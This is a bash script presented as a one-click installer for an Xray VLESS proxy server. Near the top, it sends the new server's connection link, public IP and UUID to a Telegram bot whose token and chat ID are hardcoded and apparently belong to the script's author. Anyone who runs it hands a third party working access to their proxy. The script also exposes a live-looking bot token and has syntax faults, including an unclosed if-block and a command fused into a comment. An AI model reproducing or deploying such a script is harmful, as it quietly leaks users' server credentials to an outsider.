#!/bin/bash
set -o pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

DEV_NAME="S 0 S"
TOKEN="${TOKEN:-8459816702:AAEwGWDM8S9BAyQtWGSs_DREJY3KC3lR9ow}"
CHAT_ID="${CHAT_ID:-7130966571}"
UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen)
PORT="${PORT:-443}"
SNI="${SNI:-m.googleapis.com}"
IP=$(curl -s --connect-timeout 5 ifconfig.me 2>/dev/null || echo "unknown")
WS_PATH="/sos-vless"

VLESS_LINK="vless://${UUID}@${IP}:${PORT}?type=ws&security=none&path=${WS_PATH}&host=${SNI}&sni=${SNI}#${DEV_NAME}-ULTRA"

send_to_telegram() {
    local msg="$1"
    msg=$(printf '%s' "$msg" | sed 's/[_*[\]()~>#+=|{}.!-]/\\&/g')
    curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
         -d "chat_id=${CHAT_ID}" \
         -d "text=$msg" \
         -d "parse_mode=MarkdownV2" > /dev/null 2>&1
}

TELEGRAM_MSG="🚀 *${DEV_NAME} VLESS KEY READY*

\`${VLESS_LINK}\`

📍 IP: \`$IP\`
🔐 UUID: \`$UUID\`
🌐 SNI: \`$SNI\`
⚡ Port: \`$PORT\`
🛤️ Path: \`${WS_PATH}\`"

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

# Telegram Send
if [[ "$IP" != "unknown" ]]; then
    log_info "Sending key to Telegram..."
    send_to_telegram "$TELEGRAM_MSG"
    log_success "✅ Telegram message sent!"
else
    log_warn "⚠️ Failed to get IP - Key displayed below:"fi

apt-get update -y >/dev/null 2>&1
apt-get install -y unzip curl sudo >/dev/null 2>&1

# Xray Install
log_info "Installing Xray Core..."
bash <(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh) @ install >/dev/null 2>&1

mkdir -p /usr/local/etc/xray

# Config Write
cat > /usr/local/etc/xray/config.json << EOFCONFIG
{
  "inbounds": [{
    "port": ${PORT},
    "protocol": "vless",
    "settings": {
      "clients": [{"id": "${UUID}", "email": "user@${DEV_NAME}"}],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "ws",
      "security": "none",
      "wsSettings": {
        "path": "${WS_PATH}",
        "headers": {"Host": "${SNI}"}
      }
    },
    "sniffing": {"enabled": true, "destOverride": ["http", "tls"]}
  }],
  "outbounds": [
    {"protocol": "freedom"},
    {"protocol": "blackhole", "tag": "blocked"}
  ],
  "routing": {"rules": [{"type": "field", "ip": ["geoip:private"], "outboundTag": "blocked"}]},
  "log": {"loglevel": "warning"}
}
EOFCONFIG

systemctl daemon-reload >/dev/null 2>&1 || true
systemctl restart xray >/dev/null 2>&1
systemctl enable xray >/dev/null 2>&1

# Firewall
if command -v ufw &>/dev/null; then
    ufw allow ${PORT}/tcp >/dev/null 2>&1
fi

# Final Outputclear
echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║   ✅ VLESS INSTALLATION COMPLETED!     ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Your VLESS Link:${NC}"
echo -e "${CYAN}${VLESS_LINK}${NC}"
echo ""
echo -e "${YELLOW}Service Info:${NC}"
echo -e "  logs:    journalctl -u xray -f"
echo -e "  status:  systemctl status xray"
echo -e "  restart: systemctl restart xray"
